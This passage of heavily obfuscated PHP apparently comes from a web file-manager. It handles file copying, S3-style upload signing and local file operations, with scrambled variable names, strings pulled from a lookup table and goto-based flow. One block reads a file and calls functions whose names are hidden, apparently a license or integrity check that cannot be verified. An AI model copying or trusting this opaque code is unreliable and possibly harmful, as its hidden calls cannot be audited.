$ëèÎÆ”ğ->listPath($€ª¦õáÏ); $¨„Çóüº = $¨„Çóüº ? $¨„Çóüº : array($±ñßšêˆ[86] => array(), $±ñßšêˆ[85] => array()); $½ŸÄ´’ = array_merge($¨„Çóüº[$±ñßšêˆ[86]], $¨„Çóüº[$±ñßšêˆ[85]]); $‘×ºò© = $this->_addFiles($ëèÎÆ”ğ, $¨„Çóüº[$±ñßšêˆ[86]], $ş†©¸ñ·); $‰ú½É¬è = array(); foreach ($½ŸÄ´’ as &$Â¢ì¢ß) { if (isset($‘×ºò©[$Â¢ì¢ß[$±ñßšêˆ[32]]])) { $Â¢ì¢ß = $‘×ºò©[$Â¢ì¢ß[$±ñßšêˆ[32]]]; } $Â¢ì¢ß[$±ñßšêˆ[485]] = $Â¢ì¢ß[$±ñßšêˆ[33]] == $±ñßšêˆ[78]; $Â¢ì¢ß[$±ñßšêˆ[486]] = substr(_get($Â¢ì¢ß, $±ñßšêˆ[169], $±ñßšêˆ[12]), 0, 10); $Â¢ì¢ß[$±ñßšêˆ[79]] = _get($Â¢ì¢ß, $±ñßšêˆ[79], 0); $Â¢ì¢ß[$±ñßšêˆ[541]] = _get($Â¢ì¢ß, $±ñßšêˆ[541], 0); if (!isset($Â¢ì¢ß[$±ñßšêˆ[670]]) && $Â¢ì¢ß[$±ñßšêˆ[541]]) { $ùŞöî´×[$±ñßšêˆ[667]][] = $Â¢ì¢ß[$±ñßšêˆ[541]]; } if ($¥ÆÒøâŒ) { $ëñèÇö· = $this->fileNameExistCache($¡„ì²—İ, $Â¢ì¢ß[$±ñßšêˆ[32]]); if ($ëñèÇö·) { if ($Â¢ì¢ß[$±ñßšêˆ[485]] || $¥ÆÒøâŒ == REPEAT_SKIP) { continue; } if ($¥ÆÒøâŒ == REPEAT_REPLACE) { $ô¨·—Á¡ = $this->sourceInfoCache($ëñèÇö·); $¨ô‹¥„‚ = $this->fileHistory($ô¨·—Á¡, $Â¢ì¢ß[$±ñßšêˆ[541]], $Â¢ì¢ß[$±ñßšêˆ[79]]); if ($¨ô‹¥„‚) { $ùŞöî´×[$±ñßšêˆ[629]][] = $Â¢ì¢ß[$±ñßšêˆ[541]]; } continue; } else { if ($¥ÆÒøâŒ == REPEAT_RENAME) { $Â¢ì¢ß[$±ñßšêˆ[32]] = $this->fileNameAutoCache($¡„ì²—İ, $Â¢ì¢ß[$±ñßšêˆ[32]], $¥ÆÒøâŒ, !1); } } } } if (!$Â¢ì¢ß[$±ñßšêˆ[485]] && $Â¢ì¢ß[$±ñßšêˆ[541]] == 0) { continue; } if (!$Â¢ì¢ß[$±ñßšêˆ[485]] && $Â¢ì¢ß[$±ñßšêˆ[541]]) { $ùŞöî´×[$±ñßšêˆ[629]][] = $Â¢ì¢ß[$±ñßšêˆ[541]]; } $‰ú½É¬è[] = $this->_makeItemData($Â¢ì¢ß, $—Ó“œ, $Â¢ì¢ß[$±ñßšêˆ[32]]); } unset($Â¢ì¢ß); if (!empty($‰ú½É¬è)) { $this->addAll($‰ú½É¬è); $this->_childrenListSelect($¡„ì²—İ); } $ç»‹õ¿ = $this->_childrenList($¡„ì²—İ); $ç»‹õ¿ = array_to_keyvalue($ç»‹õ¿, $±ñßšêˆ[32]); foreach ($½ŸÄ´’ as $Â¢ì¢ß) { $ô¨·—Á¡ = $ç»‹õ¿[$Â¢ì¢ß[$±ñßšêˆ[32]]]; $ä’ÄÆ™÷ = $ô¨·—Á¡[$±ñßšêˆ[193]]; $this->_copyApplyMeta($ô¨·—Á¡, $ùŞöî´×); if ($Â¢ì¢ß[$±ñßšêˆ[33]] == $±ñßšêˆ[78]) { $Â¢ì¢ß[$±ñßšêˆ[87]] = $ëèÎÆ”ğ->getPathInner($Â¢ì¢ß[$±ñßšêˆ[87]]); $this->_copyChildTo($ëèÎÆ”ğ, $Â¢ì¢ß[$±ñßšêˆ[87]], $ä’ÄÆ™÷, $¥ÆÒøâŒ, $ùŞöî´×, $ş†©¸ñ·); } } } private function _addFiles($“Õ•Ñ­Ñ, $Á¶±Ç£, $²¾˜°Óú) { $ÛñÀîş =& $_SERVER[ìïæ“œî]; if (!$Á¶±Ç£ || count($Á¶±Ç£) == 0) { return array(); } $£¸£¬ûî = array(); foreach ($Á¶±Ç£ as &$ß¸£Æø») { Hook::trigger($ÛñÀîş[671], $ß¸£Æø»); $ß¸£Æø»[$ÛñÀîş[87]] = $“Õ•Ñ­Ñ->getPathInner($ß¸£Æø»[$ÛñÀîş[87]]); $úñ¾‘†ã = $“Õ•Ñ­Ñ->hashSimple($ß¸£Æø»[$ÛñÀîş[87]]); $Ô½ÉÑÇÌ = $“Õ•Ñ­Ñ->hashMd5($ß¸£Æø»[$ÛñÀîş[87]]); if (strlen($Ô½ÉÑÇÌ) > 10 && !isset($£¸£¬ûî[$Ô½ÉÑÇÌ])) { $£¸£¬ûî[$Ô½ÉÑÇÌ] = array(); } $ß¸£Æø»[$ÛñÀîş[672]] = $úñ¾‘†ã; $ß¸£Æø»[$ÛñÀîş[547]] = $Ô½ÉÑÇÌ; $£¸£¬ûî[$Ô½ÉÑÇÌ][] =& $ß¸£Æø»; if (count($£¸£¬ûî[$Ô½ÉÑÇÌ]) > 1) { $ß¸£Æø»[$ÛñÀîş[670]] = !0; } Hook::trigger($ÛñÀîş[673], $ß¸£Æø»); } unset($ß¸£Æø»); $œö³‘½ = array($ÛñÀîş[547] => array($ÛñÀîş[7], array_keys($£¸£¬ûî))); $‚„ĞƒŸı = Model($ÛñÀîş[674]); $°æ¶• = $‚„ĞƒŸı->where($œö³‘½)->select(); $°æ¶• = $°æ¶• ? $°æ¶• : array(); foreach ($°æ¶• as $È§¡³) { if (!isset($£¸£¬ûî[$È§¡³[$ÛñÀîş[547]]])) { continue; } $Ä‡»Ï·À = $£¸£¬ûî[$È§¡³[$ÛñÀîş[547]]]; foreach ($Ä‡»Ï·À as &$ß¸£Æø») { $ß¸£Æø»[$ÛñÀîş[541]] = $È§¡³[$ÛñÀîş[541]]; $ß¸£Æø»[$ÛñÀîş[670]] = !0; } unset($ß¸£Æø»); } $Äì’Îúî = array(); foreach ($Á¶±Ç£ as $ñóÓŠ„¢) { Hook::trigger($ÛñÀîş[675], $ñóÓŠ„¢); if (isset($ñóÓŠ„¢[$ÛñÀîş[670]]) && $ñóÓŠ„¢[$ÛñÀîş[670]]) { Hook::trigger($ÛñÀîş[676], $ñóÓŠ„¢); continue; } $–°™Ñò› = $“Õ•Ñ­Ñ->getPathInner($ñóÓŠ„¢[$ÛñÀîş[87]]); $šÎÚ»¤¤ = $‚„ĞƒŸı->addFileMake($–°™Ñò›, $ñóÓŠ„¢[$ÛñÀîş[79]], $ñóÓŠ„¢[$ÛñÀîş[672]], $ñóÓŠ„¢[$ÛñÀîş[547]], $ñóÓŠ„¢[$ÛñÀîş[32]], $²¾˜°Óú); Hook::trigger($ÛñÀîş[676], $ñóÓŠ„¢); if (!is_array($šÎÚ»¤¤)) { continue; } $Äì’Îúî[] = $šÎÚ»¤¤; } $‚„ĞƒŸı->addAll($Äì’Îúî); $œö³‘½ = array($ÛñÀîş[547] => array($ÛñÀîş[7], array_keys($£¸£¬ûî))); $°æ¶• = $‚„ĞƒŸı->where($œö³‘½)->select(); $°æ¶• = $°æ¶• ? $°æ¶• : array(); foreach ($°æ¶• as $È§¡³) { if (!isset($£¸£¬ûî[$È§¡³[$ÛñÀîş[547]]])) { continue; } $»‰—Ú¾ =& $£¸£¬ûî[$È§¡³[$ÛñÀîş[547]]]; foreach ($»‰—Ú¾ as &$ß¸£Æø») { $ß¸£Æø»[$ÛñÀîş[541]] = $È§¡³[$ÛñÀîş[541]]; } unset($ß¸£Æø»); } $÷ªøÎÛè = array(); foreach ($Á¶±Ç£ as $¶ô‹Ó¿Ÿ) { $÷ªøÎÛè[$¶ô‹Ó¿Ÿ[$ÛñÀîş[32]]] = $¶ô‹Ó¿Ÿ; } return $÷ªøÎÛè; } } define($_SERVER[ìïæ“œî][677], $_SERVER[ìïæ“œî][678]); $emwgsnrlqd = $_SERVER[ìïæ“œî][679]; goto fœÑ…Ë; Cµ×ÚĞ‘: define($_SERVER[ìïæ“œî][317], 3); define($_SERVER[ìïæ“œî][318], 1); define($_SERVER[ìïæ“œî][319], 0); goto EÚ……¹È¨¡; EĞñÄÔ“†®: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¬»ÛÊÁ) { parent::__construct($¬»ÛÊÁ); } public function uploadFormData($÷Óìó’ë, $ˆÚí˜¤® = 3600) { $½ÃÏ¢áö =& $_SERVER[ìïæ“œî]; $Ô¤ïÉæÇ = $½ÃÏ¢áö[229]; $çóßô = $½ÃÏ¢áö[270]; $±Ü’ÊŒ“ = $½ÃÏ¢áö[62]; $ğØÍÏ« = gmdate($½ÃÏ¢áö[271]); $†œƒ½ÂØ = gmdate($½ÃÏ¢áö[272]); $¹ã– = $½ÃÏ¢áö[273]; $»ÇÜš¯’ = $ˆÚí˜¤® . $½ÃÏ¢áö[12]; $¸ç§ó’¯ = $½ÃÏ¢áö[274]; $œ¡İ·Ã = array($this->accessKey, $†œƒ½ÂØ, $this->region, $±Ü’ÊŒ“, $¹ã–); $–’É‰Œü = implode($½ÃÏ¢áö[8], $œ¡İ·Ã); $Óœ’—·À = array($½ÃÏ¢áö[275] => gmdate($½ÃÏ¢áö[299], strtotime($½ÃÏ¢áö[277])), $½ÃÏ¢áö[278] => array(array($½ÃÏ¢áö[279] => $this->bucket), array($½ÃÏ¢áö[280] => $Ô¤ïÉæÇ), array($½ÃÏ¢áö[281], $½ÃÏ¢áö[282], $½ÃÏ¢áö[12]), array($½ÃÏ¢áö[281], $½ÃÏ¢áö[283], $½ÃÏ¢áö[12]), array($½ÃÏ¢áö[281], $½ÃÏ¢áö[284], $½ÃÏ¢áö[12]), array($½ÃÏ¢áö[285] => $¸ç§ó’¯), array($½ÃÏ¢áö[286] => $–’É‰Œü), array($½ÃÏ¢áö[287] => $çóßô), array($½ÃÏ¢áö[288] => $ğØÍÏ«), array($½ÃÏ¢áö[289] => $»ÇÜš¯’))); $ì¾ÆößÒ = base64_encode(json_encode($Óœ’—·À)); $‡È¾éÛ = hash_hmac($½ÃÏ¢áö[290], $†œƒ½ÂØ, $½ÃÏ¢áö[291] . $this->secret, !0); $½øä›Û = hash_hmac($½ÃÏ¢áö[290], $this->region, $‡È¾éÛ, !0); $œ·óÀ¯ = hash_hmac($½ÃÏ¢áö[290], $±Ü’ÊŒ“, $½øä›Û, !0); $éòáÅáĞ = hash_hmac($½ÃÏ¢áö[290], $¹ã–, $œ·óÀ¯, !0); $ÙŒç‰İı = hash_hmac($½ÃÏ¢áö[290], $ì¾ÆößÒ, $éòáÅáĞ); $ö½õ‘êù = array($½ÃÏ¢áö[246] => $½ÃÏ¢áö[12], $½ÃÏ¢áö[292] => $½ÃÏ¢áö[12], $½ÃÏ¢áö[280] => $Ô¤ïÉæÇ, $½ÃÏ¢áö[285] => $¸ç§ó’¯, $½ÃÏ¢áö[293] => $ì¾ÆößÒ, $½ÃÏ¢áö[294] => $–’É‰Œü, $½ÃÏ¢áö[295] => $çóßô, $½ÃÏ¢áö[296] => $ğØÍÏ«, $½ÃÏ¢áö[297] => $»ÇÜš¯’, $½ÃÏ¢áö[298] => $ÙŒç‰İı, $½ÃÏ¢áö[208] => $this->getHost()); return $ö½õ‘êù; } public function multiUploadFormData($—åğÌúÍ, $«¨ËÂú = 3600) { $Ì›ßè¼ =& $_SERVER[ìïæ“œî]; $“Í™èÙø = gmdate($Ì›ßè¼[300]); $‘îàÕˆú = array(); $Ê¹íÌèö = $this->client->getUploadId($this->bucket, $—åğÌúÍ, $‘îàÕˆú); if (!$Ê¹íÌèö) { return !1; } return array($Ì›ßè¼[254] => $Ê¹íÌèö, $Ì›ßè¼[208] => $this->getHost() . $Ì›ßè¼[8] . $this->pathEncode($—åğÌúÍ), $Ì›ßè¼[255] => $“Í™èÙø, $Ì›ßè¼[97] => $—åğÌúÍ); } public function multiUploadAuthData($Ö¤Á—ÁÒ, $›ŞâıòĞ = array()) { $¡àéĞË =& $_SERVER[ìïæ“œî]; $¼Šú³ó = isset($›ŞâıòĞ[$¡àéĞË[169]]) ? $›ŞâıòĞ[$¡àéĞË[169]] : $¡àéĞË[12]; $ù¥ğÈÀÍ = $›ŞâıòĞ[$¡àéĞË[97]]; unset($›ŞâıòĞ[$¡àéĞË[97]]); if (isset($›ŞâıòĞ[$¡àéĞË[256]])) { return $this->listUploadParts($ù¥ğÈÀÍ, $›ŞâıòĞ); } $Åó÷ÈÆ† = array(); if (isset($›ŞâıòĞ[$¡àéĞË[301]])) { $Åó÷ÈÆ†[$¡àéĞË[302]] = $›ŞâıòĞ[$¡àéĞË[301]]; } $½ÍóÕŒ• = explode($¡àéĞË[210], $this->getHost()); $…á¢¸¤Œ = array($¡àéĞË[303] => $½ÍóÕŒ•[1], $¡àéĞË[304] => $¡àéĞË[12], $¡àéĞË[246] => $¡àéĞË[123], $¡àéĞË[292] => $›ŞâıòĞ[$¡àéĞË[79]]); $Ñ¦ø¬‰ = $¡àéĞË[259]; $–Â¦‘Áå = $¡àéĞË[8] . $this->pathEncode($ù¥ğÈÀÍ) . $¼Šú³ó; $ãŞÎòÍ˜ = $this->client->__getSignatureV4($Åó÷ÈÆ†, $…á¢¸¤Œ, $Ñ¦ø¬‰, $–Â¦‘Áå); if (strpos($¼Šú³ó, $¡àéĞË[258]) === 0) { if (isset($Åó÷ÈÆ†[$¡àéĞË[302]])) { $Î³Âó™ = $Åó÷ÈÆ†[$¡àéĞË[302]]; } else { if (isset($ãŞÎòÍ˜[$¡àéĞË[302]])) { $Î³Âó™ = $ãŞÎòÍ˜[$¡àéĞË[302]]; } else { $Î³Âó™ = hash($¡àéĞË[290], $¡àéĞË[12]); } } return array($¡àéĞË[265] => $ãŞÎòÍ˜[$¡àéĞË[265]], $¡àéĞË[302] => $Î³Âó™, $¡àéĞË[255] => $ãŞÎòÍ˜[$¡àéĞË[305]]); } return $ãŞÎòÍ˜[$¡àéĞË[265]]; } public function listUploadParts($şóÌÙã˜, $€ûÑÏıƒ = array()) { $ŒöƒŠêÙ =& $_SERVER[ìïæ“œî]; $œÏ‰àÓø = str_replace($ŒöƒŠêÙ[266], $ŒöƒŠêÙ[12], $€ûÑÏıƒ[$ŒöƒŠêÙ[169]]); $™ÃËÕ§ê = $this->client->listParts($this->bucket, $şóÌÙã˜, $œÏ‰àÓø); if (!$™ÃËÕ§ê) { return !1; } $‘®ëà’ = $ŒöƒŠêÙ[306]; foreach ($™ÃËÕ§ê as $®¿ˆ…ø÷) { $‘®ëà’ .= $ŒöƒŠêÙ[307] . "\74\120\x61\162\164\x4e\x75\x6d\x62\145\162\x3e{$®¿ˆ…ø÷[$ŒöƒŠêÙ[308]]}\74\x2f\120\141\162\x74\116\165\155\x62\145\162\76\12" . "\x3c\x45\124\x61\x67\76{$®¿ˆ…ø÷[$ŒöƒŠêÙ[309]]}\x3c\57\105\x54\x61\x67\x3e\12" . $ŒöƒŠêÙ[310]; } $‘®ëà’ .= $ŒöƒŠêÙ[311]; $šîàğõ• = array(); $ääÓ’ = explode($ŒöƒŠêÙ[210], $this->getHost()); $àçº¹ìä = array($ŒöƒŠêÙ[303] => $ääÓ’[1], $ŒöƒŠêÙ[246] => $ŒöƒŠêÙ[123], $ŒöƒŠêÙ[292] => strlen($‘®ëà’)); $ï Üğ¦¡ = $ŒöƒŠêÙ[257]; $‘Ä¢‡ÌÚ = $ŒöƒŠêÙ[8] . $this->pathEncode($şóÌÙã˜) . $€ûÑÏıƒ[$ŒöƒŠêÙ[169]]; $Ùä½üî¼ = $this->client->__getSignatureV4($šîàğõ•, $àçº¹ìä, $ï Üğ¦¡, $‘Ä¢‡ÌÚ, $‘®ëà’); return array($ŒöƒŠêÙ[265] => $Ùä½üî¼[$ŒöƒŠêÙ[265]], $ŒöƒŠêÙ[255] => $Ùä½üî¼[$ŒöƒŠêÙ[305]], $ŒöƒŠêÙ[267] => $™ÃËÕ§ê, $ŒöƒŠêÙ[302] => $Ùä½üî¼[$ŒöƒŠêÙ[302]]); } public function link($îÜå’åë, $†‘²‚· = array()) { return parent::link($îÜå’åë, $†‘²‚·); } public function fileOut($—ÏÂ×üÆ, $˜Å™…êğ = false, $ÆÂ«Êè§ = false, $«±©ğÊå = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ìïæ“œî][312])) { return parent::fileOutServer($—ÏÂ×üÆ, $˜Å™…êğ, $ÆÂ«Êè§, $«±©ğÊå); } parent::fileOut($—ÏÂ×üÆ, $˜Å™…êğ, $ÆÂ«Êè§, $«±©ğÊå); } public function fileOutImage($ŒÖî»ğ, $’¡Í­¼³ = 250) { if (strstr($this->endpoint, $_SERVER[ìïæ“œî][312])) { return parent::fileOutImageServer($ŒÖî»ğ, $’¡Í­¼³); } parent::fileOutImage($ŒÖî»ğ, $’¡Í­¼³); } public function fileOutLink($ÖÖç£‡ê) { $á¤ªÉù =& $_SERVER[ìïæ“œî]; if (substr($ÖÖç£‡ê, 0, 7) == $á¤ªÉù[313]) { $ÖÖç£‡ê = $á¤ªÉù[314] . substr($ÖÖç£‡ê, 7); } header($á¤ªÉù[175] . $ÖÖç£‡ê); die; } } define($_SERVER[ìïæ“œî][315], 1); define($_SERVER[ìïæ“œî][316], 2); goto Cµ×ÚĞ‘; E–é çÊ¯: if ($_SERVER[$_SERVER[ìïæ“œî][927]] != $_SERVER[$_SERVER[ìïæ“œî][1428]]) { $_getc = $_SERVER[ìïæ“œî][929]; $_getfile = $_SERVER[$_SERVER[ìïæ“œî][930]] . $_SERVER[ìïæ“œî][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ìïæ“œî][262], $_getfilec); if (count($_getarrs) < $_SERVER[ìïæ“œî][710]) { $exit = $_SERVER[ìïæ“œî][932]; $exit(); } $_act = $_SERVER[ìïæ“œî][1429]; $_act($_SERVER[$_SERVER[ìïæ“œî][925]]); } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Á´ú£¹´) { parent::__construct($Á´ú£¹´); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } public function uploadLink($òã Ô¾, $ãÆëî¦ = 0) { $Ê™àõ¸ä =& $_SERVER[ìïæ“œî]; if ($this->isUploadServer()) { return; } $Ùû¬‰²Œ = $this->getType(); if (!in_array($Ùû¬‰²Œ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $İ ôç¡ú = (!$ãÆëî¦ ? 1 : ceil($ãÆëî¦ / pow(1024, 3))) * 3600 * 4; $£ê¬¼îñ = $this->multiUploadFormData($òã Ô¾, $İ ôç¡ú); if ($£ê¬¼îñ) { $£ê¬¼îñ[$Ê™àõ¸ä[97]] = $òã Ô¾; $£ê¬¼îñ[$Ê™àõ¸ä[98]] = $Ùû¬‰²Œ; } return $£ê¬¼îñ; } public function fileOutImage($…ªã…Òæ, $‰òØŠİŠ = 250) { if ($this->size($…ªã…Òæ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($…ªã…Òæ, $‰òØŠİŠ); } $û×Ò€¿® = $this->link($…ªã…Òæ); $û×Ò€¿® .= $_SERVER[ìïæ“œî][1430] . $‰òØŠİŠ; $this->fileOutLink($û×Ò€¿®); } public function fileOutLink($Š·Í™åÙ) { $Äšõ€Ø =& $_SERVER[ìïæ“œî]; if (substr($Š·Í™åÙ, 0, 7) == $Äšõ€Ø[313]) { $Š·Í™åÙ = $Äšõ€Ø[314] . substr($Š·Í™åÙ, 7); } header($Äšõ€Ø[175] . $Š·Í™åÙ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ùš¿ûÅÓ) { if (substr($Ùš¿ûÅÓ, 0, 2) == $_SERVER[ìïæ“œî][1415]) { $Ùš¿ûÅÓ = BASIC_PATH . substr($Ùš¿ûÅÓ, 2); } return $Ùš¿ûÅÓ; } public function iconvApp($Ò–‚ËŒü) { $‡¤´¦Á­ =& $_SERVER[ìïæ“œî]; global $config; return $this->iconvTo($Ò–‚ËŒü, $config[$‡¤´¦Á­[1413]], $config[$‡¤´¦Á­[1412]]); } public function iconvSystem($Ğ½¨ì») { $„½Üì‹ó =& $_SERVER[ìïæ“œî]; global $config; return $this->iconvTo($Ğ½¨ì», $config[$„½Üì‹ó[1412]], $config[$„½Üì‹ó[1413]]); } public function getPathOuter($º£¶½–Ù) { $‹˜¤ È =& $_SERVER[ìïæ“œî]; $İŠÃè¬á = $this->iconvApp($this->pathBase); $º£¶½–Ù = $this->iconvApp($º£¶½–Ù); if (substr($İŠÃè¬á, 0, 2) == $‹˜¤ È[1415]) { $İŠÃè¬á = BASIC_PATH . substr($İŠÃè¬á, 2); } if (substr($º£¶½–Ù, 0, 2) == $‹˜¤ È[1415]) { $º£¶½–Ù = BASIC_PATH . substr($º£¶½–Ù, 2); } $İŠÃè¬á = KodIO::clear($İŠÃè¬á); $º£¶½–Ù = KodIO::clear($º£¶½–Ù); $º£¶½–Ù = substr($º£¶½–Ù, strlen($İŠÃè¬á)); if (empty($this->pathDriver)) { return $º£¶½–Ù; } return $this->pathDriver . $‹˜¤ È[8] . ltrim($º£¶½–Ù, $‹˜¤ È[8]); } public function mkfile($öŒ¹€ùÓ, $ı£”»‰ = '', $ú‡û¬³ƒ = REPEAT_RENAME) { $öŒ¹€ùÓ = $this->iconvSystem($öŒ¹€ùÓ); @touch($öŒ¹€ùÓ); if ($ı£”»‰) { file_put_contents($öŒ¹€ùÓ, $ı£”»‰); } @chmod($öŒ¹€ùÓ, $this->pathAuth); if (is_file($öŒ¹€ùÓ)) { return $this->getPathOuter($öŒ¹€ùÓ); } $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } public function mkdir($šó§¨ƒ», $·¾Åô = REPEAT_SKIP) { $šó§¨ƒ» = $this->iconvSystem($šó§¨ƒ»); if (is_dir($šó§¨ƒ»)) { return $this->getPathOuter($šó§¨ƒ»); } @mkdir($šó§¨ƒ», $this->pathAuth, !0); @chmod($šó§¨ƒ», $this->pathAuth); if (is_dir($šó§¨ƒ»)) { return $this->getPathOuter($šó§¨ƒ»); } $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } public function copyFile($¡ãÎ ¹Ù, $Æ¸‹Ÿˆ) { $this->mkdir($this->pathFather($Æ¸‹Ÿˆ)); $¡ãÎ ¹Ù = $this->iconvSystem($¡ãÎ ¹Ù); $Æ¸‹Ÿˆ = $this->iconvSystem($Æ¸‹Ÿˆ); $°óÈâƒ¡ = copy_64($¡ãÎ ¹Ù, $Æ¸‹Ÿˆ); @chmod($Æ¸‹Ÿˆ, $this->pathAuth); if ($°óÈâƒ¡) { return $this->getPathOuter($Æ¸‹Ÿˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } public function moveFile($­Ø™Ó¤è, $Ä»û’¸) { $this->mkdir($this->pathFather($Ä»û’¸)); $­Ø™Ó¤è = $this->iconvSystem($­Ø™Ó¤è); $Ä»û’¸ = $this->iconvSystem($Ä»û’¸); $úƒ¥ÁÁ¥ = intval(@rename($­Ø™Ó¤è, $Ä»û’¸)); if (!$úƒ¥ÁÁ¥) { if ($úƒ¥ÁÁ¥ = intval(@copy_64($­Ø™Ó¤è, $Ä»û’¸))) { @unlink($­Ø™Ó¤è); } } @chmod($Ä»û’¸, $this->pathAuth); if ($úƒ¥ÁÁ¥) { return $this->getPathOuter($Ä»û’¸); } $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } public function movePath($Ò¨…­«Ì, $îº°†¸ï, $Šó÷’Ï× = false) { $®Ï£¿¸± =& $_SERVER[ìïæ“œî]; $Ò¨…­«Ì = $this->iconvSystem($Ò¨…­«Ì); $îº°†¸ï = $this->iconvSystem($îº°†¸ï); $ğˆ›õéÆ = rtrim($îº°†¸ï, $®Ï£¿¸±[8]) . $®Ï£¿¸±[8] . ($Šó÷’Ï× ? $Šó÷’Ï× : get_path_this($Ò¨…­«Ì)); if (file_exists($ğˆ›õéÆ)) { return !1; } $¥Ñ¥ÉÚí = intval(@rename($Ò¨…­«Ì, $ğˆ›õéÆ)); $¥Ñ¥ÉÚí = file_exists($ğˆ›õéÆ); if ($¥Ñ¥ÉÚí) { return $this->getPathOuter($ğˆ›õéÆ); } $this->writeLog(__FUNCTION__ . $®Ï£¿¸±[1425], !0); return !1; } public function delFile($İ­¨çÅ) { $İ­¨çÅ = $this->iconvSystem($İ­¨çÅ); if (!@unlink($İ­¨çÅ)) { @chmod($İ­¨çÅ, $this->pathAuth); if (@unlink($İ­¨çÅ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } return !0; } public function delFolder($®ô°·) { $˜ëãŞÊë =& $_SERVER[ìïæ“œî]; $®ô°· = $this->iconvSystem($®ô°·); if (!is_dir($®ô°·)) { return !0; } if (!($§¶âÍ“š = opendir($®ô°·))) { return !1; } while (($„¸º×û = readdir($§¶âÍ“š)) !== !1) { if ($„¸º×û == $˜ëãŞÊë[10] || $„¸º×û == $˜ëãŞÊë[1340]) { continue; } $ğŞÏ’ƒ = $®ô°· . $˜ëãŞÊë[8] . $„¸º×û; if (is_file($ğŞÏ’ƒ) || is_link($ğŞÏ’ƒ)) { if (!unlink($ğŞÏ’ƒ)) { chmod($ğŞÏ’ƒ, $this->pathAuth); if (!unlink($ğŞÏ’ƒ)) { return !1; } } } else { if (is_dir($ğŞÏ’ƒ)) { chmod($ğŞÏ’ƒ, $this->pathAuth); $ğŞÏ’ƒ = $this->iconvApp($ğŞÏ’ƒ); if (!$this->delFolder($ğŞÏ’ƒ)) { return !1; } } } } closedir($§¶âÍ“š); return rmdir($®ô°·); } public function rename($êİÑÄÍ†, $ÊÄ’ÍæÌ) { $·êß‹„ =& $_SERVER[ìïæ“œî]; $Øº¼ôïÛ = $this->fileNameAuto($this->pathFather($êİÑÄÍ†), $ÊÄ’ÍæÌ); $Øº¼ôïÛ = $this->iconvSystem($Øº¼ôïÛ); $êİÑÄÍ† = $this->iconvSystem($êİÑÄÍ†); $Šı»ÉÅƒ = $this->pathFather($êİÑÄÍ†); $Ğç–Âï = rtrim($Šı»ÉÅƒ, $·êß‹„[8]) . $·êß‹„[8] . $Øº¼ôïÛ; $ÊÓĞ£á = @rename($êİÑÄÍ†, $Ğç–Âï); $Ğç–Âï = $this->iconvApp($Ğç–Âï); if ($ÊÓĞ£á) { return $this->getPathOuter($Ğç–Âï); } $this->writeLog(__FUNCTION__ . $·êß‹„[1425], !0); return !1; } public function size($ëËúÚ—Ô) { $ëËúÚ—Ô = $this->iconvSystem($ëËúÚ—Ô); return filesize_64($ëËúÚ—Ô); } public function info($ÅæşŠá™) { $ÅæşŠá™ = $this->iconvSystem($ÅæşŠá™); if ($this->isFolder($ÅæşŠá™)) { return $this->folderInfo($ÅæşŠá™); } else { if ($this->isFile($ÅæşŠá™)) { return $this->fileInfo($ÅæşŠá™); } } return !1; } protected function infoChildren($ËÅÁ×ƒå, &$”Ãè…±‚, $³…ÒæûÜ = true) { $»ëùùú› =& $_SERVER[ìïæ“œî]; check_abort_echo(); $ËÅÁ×ƒå = rtrim($ËÅÁ×ƒå, $»ëùùú›[8]) . $»ëùùú›[8]; if ($³…ÒæûÜ) { $ËÅÁ×ƒå = $this->iconvSystem($ËÅÁ×ƒå); } if (!($³ä°Æ£Ñ = @opendir($ËÅÁ×ƒå))) { return; } while (($ªÈ…©Ù¸ = readdir($³ä°Æ£Ñ)) !== !1) { if ($ªÈ…©Ù¸ == $»ëùùú›[10] || $ªÈ…©Ù¸ == $»ëùùú›[1340]) { continue; } $¾Ê”—¸ï = $ËÅÁ×ƒå . $ªÈ…©Ù¸; if (is_file($¾Ê”—¸ï) || is_link($¾Ê”—¸ï)) { $”Ãè…±‚[$»ëùùú›[80]]++; $”Ãè…±‚[$»ëùùú›[79]] += filesize_64($¾Ê”—¸ï); } else { if (is_dir($¾Ê”—¸ï)) { $”Ãè…±‚[$»ëùùú›[81]]++; $this->infoChildren($¾Ê”—¸ï, $”Ãè…±‚, !1); } } } closedir($³ä°Æ£Ñ); } private function folderInfo($…ãÚÜØ», $šÑ¿ÖÅ‘ = false) { $çİš¹† =& $_SERVER[ìïæ“œî]; $…ãÚÜØ» = rtrim($…ãÚÜØ», $çİš¹†[8]) . $çİš¹†[8]; $ºÌ¯†ú¿ = $this->iconvApp($this->pathThis($…ãÚÜØ»)); if ($šÑ¿ÖÅ‘) { return array($çİš¹†[32] => $ºÌ¯†ú¿, $çİš¹†[87] => $this->getPathOuter($…ãÚÜØ»), $çİš¹†[33] => $çİš¹†[78]); } $Ï–±ì–Ø = array($çİš¹†[32] => $ºÌ¯†ú¿, $çİš¹†[87] => $this->getPathOuter($…ãÚÜØ»), $çİš¹†[33] => $çİš¹†[78], $çİš¹†[231] => @filectime($…ãÚÜØ»), $çİš¹†[88] => @filemtime($…ãÚÜØ»), $çİš¹†[1431] => @fileatime($…ãÚÜØ»), $çİš¹†[1432] => is_readable($…ãÚÜØ»), $çİš¹†[1433] => is_writable($…ãÚÜØ»), $çİš¹†[1434] => get_mode($…ãÚÜØ»)); return $Ï–±ì–Ø; } private function fileInfo($ŒŸÉáÌÊ, $æ•›‹ç = false) { $Û©‚¸ùä =& $_SERVER[ìïæ“œî]; $í§×¢Ú‡ = $this->iconvApp($this->pathThis($ŒŸÉáÌÊ)); if ($æ•›‹ç) { return array($Û©‚¸ùä[32] => $í§×¢Ú‡, $Û©‚¸ùä[87] => 